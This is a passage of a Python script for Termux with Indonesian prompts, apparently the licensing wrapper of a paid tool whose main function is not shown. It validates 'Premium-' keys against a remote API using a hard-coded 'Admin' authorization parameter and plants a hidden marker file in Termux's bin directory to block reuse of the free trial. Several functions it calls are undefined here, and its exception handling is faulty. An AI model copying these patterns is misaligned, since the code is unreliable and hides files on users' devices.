U = '\x1b[0;35m' 
O = '\x1b[0;36m'
exp = []
status = []
email = []
nama_a = []

def free():
	if os.path.isfile("/data/data/com.termux/files/usr/bin/.asep"):
		exit(f"- Lisensi Hanya berlaku 1 Kali")
	nama = input(f'- Nama {M}:{H} ')
	data = {"Authorization":"Admin","name":nama,"hari":"1"}
	res = requests.post("https://xenzi-apikey.herokuapp.com/api/create-free",params=data).text
	respon = json.loads(res)
	if "berhasil membuat apikey" in respon["massage"]:
		nama_a.append(respon['nama'])
		status.append(respon['status'])
		exp.append(respon['exp'])
		email.append(respon['email'])
		print(f"- Nama {M}: {H}{respon['nama']}")
		print(f"- Email {M}: {H}{respon['email']}")
		open(".apikey.txt","w").write(respon["apikey"])
		open("/data/data/com.termux/files/usr/bin/.asep","w").write(" Free Apikey cuman 1 kali >_<")
		time.sleep(2)
		login()
	else:
		print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
def prem():
	os.system("rm -rf .apikey.txt")
	print(f"\n- Masukan Lisensi Terlebih dahulu Jika Tidak Punya Silahkan Upgrade")
	key = input(f"- Liseni : ")
	if not "Premium-" in key:
		print(f"- Lisensi Tidak Terdaftar Silahkan Beli Terlebih dahulu")
		exit()
	else:
		try:
			data = {"Authorization":"Admin","apikey":key}
			res = requests.get("https://xenzi-apikey.herokuapp.com/api/check-status",params=data).text
			respon = json.loads(res)
			if 'apikey kadelwarsa' in respon['massage']:
				print(f"- Lisensi Anda Sudah kedaluwarsa")
				os.system("rm -rf .apikey.txt")
				apikey()
			elif 'berhasil check apikey' in respon['massage']:
				nama_a.append(respon['nama'])
				status.append(respon['status'])
				exp.append(respon['exp'])
				email.append(respon['email'])
				print(f"\n- Lisensi Sudah Aktif")
				print(f"\033[0m- Email \033[32m{email[0]}\033[31m {nama_a[0]}\033[0m")
				open(".apikey.txt","w").write(key)
				time.sleep(2)
				login_kamu()
			else:
				print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
				os.system("rm -rf .apikey.txt")
				apikey()
		except json.decoder.JSONDecodeError or KeyError:
			print(f"- Server Sedang eror")
			exit()

def apikey():
	banner()
	print(f'\033[0m- \033[0m\033[41mAuthor Asepitgans\033[0m\n- \033[0m\033[41mGithub https://github.com/privatescrip\033[0m')
	print('')
	os.system("rm -rf .apikey.txt")
	#print(f"1. Free 1 hari ")
	print(f"1. Masukan Lisensi ")
	print(f"2. Upgrade Premium ")
	chs = input(f"\n- Chouse : ")
	if chs in ["1","01"]:
		prem()
	elif chs in ["2","02"]:
		print('\n- 100k 1bulan\n- 50k 2minggu\n\n- Masukan Pesan, Info Tambahkan Tanda + Untuk Spasi Pesan');i=input('- Pesan : ');print('- Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2);os.system('xdg-open https://wa.me/6281331184338?text=%s'%(i));exit()
	#elif chs in ["3","03"]:
		#print('\n- ');print('- Masukan Pesan Untuk Di Kirim Ke Admin');i=input('- Pesan : ');print('- Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2);os.system('xdg-open https://wa.me/6281331184338?text=%s'%(i));exit()
def check():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	try:
		key = open(".apikey.txt","r").read()
		if not "Premium-" in key:
			apikey()
		else:
			try:
				data = {"Authorization":"Admin","apikey":key}
				res = requests.get("https://xenzi-apikey.herokuapp.com/api/check-status",params=data).text
				respon = json.loads(res)
				if 'apikey kadelwarsa' in respon['massage']:
					print(f"- Lisensi Anda Sudah kedaluwarsa")
					os.system("rm -rf .apikey.txt")
					apikey()
				elif 'berhasil check apikey' in respon['massage']:
					nama_a.append(respon['nama'])
					status.append(respon['status'])
					exp.append(respon['exp'])
					email.append(respon['email'])
					print(f"\033[0m\n- Lisensi Anda Tersisa{H} {respon['tersisa']}")
					time.sleep(2)
					login_kamu()
				else:
					print(f"- Mohon Maaf Lisensi Anda Tidak Terdaftar")
					os.system("rm -rf .apikey.txt")
					apikey()
			except json.decoder.JSONDecodeError or KeyError:
				print(f"- Server Sedang eror")
				exit()
	except FileNotFoundError:
		apikey()
	except json.decoder.JSONDecodeError or KeyError:
		print(f"- Server Sedang eror")
		exit()



if __name__=='__main__':
    try:
    	getkey()
    except requests.exceptions.ConnectionError:
        exit(f'\n[{M}!{C}] Koneksi internet bermasalah')
    folder()
